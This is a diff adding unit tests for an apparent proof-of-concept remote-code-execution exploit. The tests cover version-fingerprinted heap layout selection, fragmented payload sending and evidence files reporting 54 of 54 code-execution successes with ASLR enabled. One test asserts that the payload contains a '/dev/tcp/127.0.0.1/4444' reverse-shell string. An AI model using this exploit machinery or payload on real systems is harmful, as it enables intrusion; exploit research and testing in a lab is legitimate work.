@@ -22,6 +22,13 @@ assert HEAP_SPEC.loader is not None
 sys.modules[HEAP_SPEC.name] = HEAP
 HEAP_SPEC.loader.exec_module(HEAP)
 
+SELECTOR_PATH = ROOT / "poc" / "heap_layout_selector.py"
+SELECTOR_SPEC = importlib.util.spec_from_file_location("heap_layout_selector", SELECTOR_PATH)
+SELECTOR = importlib.util.module_from_spec(SELECTOR_SPEC)
+assert SELECTOR_SPEC.loader is not None
+sys.modules[SELECTOR_SPEC.name] = SELECTOR
+SELECTOR_SPEC.loader.exec_module(SELECTOR)
+
 
 class PocTests(unittest.TestCase):
     def test_trigger_fingerprint(self):
@@ -68,6 +75,34 @@ class PocTests(unittest.TestCase):
         self.assertIn(b"/usr/bin/id", payload)
         self.assertIn(b"/dev/tcp/127.0.0.1/4444", payload)
         self.assertNotIn(b"host.docker.internal", payload)
+
+    def test_heap_layout_selector_covers_verified_binary_fingerprints(self):
+        index = SELECTOR.verified_fingerprint_index()
+        self.assertEqual(len(index), 84)
+        for digest, match in index.items():
+            selected = SELECTOR.select_layouts(digest)
+            self.assertEqual(selected[0]["selection"], "verified-binary-fingerprint")
+            self.assertEqual(selected[0]["name"], match["layout"])
+            self.assertEqual(selected[0]["matched_version"], match["version"])
+        unknown = SELECTOR.select_layouts("f" * 64)
+        self.assertTrue(unknown)
+        self.assertTrue(
+            all(item["selection"] == "allowlisted-fallback" for item in unknown)
+        )
+
+    def test_fragmented_sender_preserves_bytes_and_bounds(self):
+        class Sink:
+            def __init__(self):
+                self.parts = []
+
+            def sendall(self, value):
+                self.parts.append(value)
+
+        sink = Sink()
+        HEAP.send_fragmented(sink, b"abcdefgh", 3)
+        self.assertEqual(sink.parts, [b"abc", b"def", b"gh"])
+        with self.assertRaises(ValueError):
+            HEAP.send_fragmented(sink, b"x", 4097)
 
     def test_stage_two_keeps_expected_corruption_fields(self):
         stage = MODULE.build_stage_two(0x137ED748, 256)
@@ -201,6 +236,38 @@ class PocTests(unittest.TestCase):
         self.assertEqual(summary["failed_or_unverified"], {})
         self.assertFalse(summary["debugger_used"])
         self.assertFalse(summary["address_read_used"])
+
+    def test_runtime_scenario_evidence_reports_raw_and_retried_rates(self):
+        scenario_dir = ROOT / "evidence" / "runtime-scenarios"
+        summary = json.loads((scenario_dir / "summary.json").read_text(encoding="utf-8"))
+        self.assertTrue(summary["complete"])
+        self.assertEqual(summary["versions"], ["22.23.3", "24.22.0", "26.12.0"])
+        self.assertEqual(summary["total_successes"], 54)
+        self.assertEqual(summary["total_trials"], 54)
+        self.assertEqual(summary["first_attempt_successes"], 48)
+        self.assertEqual(summary["total_attempts"], 60)
+        self.assertFalse(summary["debugger_used"])
+        self.assertFalse(summary["address_read_used"])
+        for version in summary["versions"]:
+            record = json.loads(
+                (scenario_dir / f"{version}.json").read_text(encoding="utf-8")
+            )
+            self.assertEqual(len(record["trials"]), 18)
+            self.assertEqual(
+                record["selected_profile"]["layout_selection"],
+                "verified-binary-fingerprint",
+            )
+            self.assertFalse(record["lab_controls"]["debugger_used"])
+            self.assertFalse(record["lab_controls"]["address_read_used"])
+            for trial in record["trials"]:
+                self.assertEqual(trial["outcome"], "rce-proof")
+                self.assertLessEqual(trial["attempt_count"], 3)
+                successful = trial["attempts"][-1]
+                self.assertEqual(successful["outcome"], "rce-proof")
+                self.assertRegex(successful["proof_token"], r"^N2S_[0-9a-f]{32}$")
+                self.assertRegex(successful["proof_stdout"], r"^uid=1000")
+                self.assertEqual(successful["runtime"]["kernel_randomize_va_space"], 2)
+                self.assertFalse(successful["runtime"]["ld_preload_present"])
 
 
 if __name__ == "__main__":
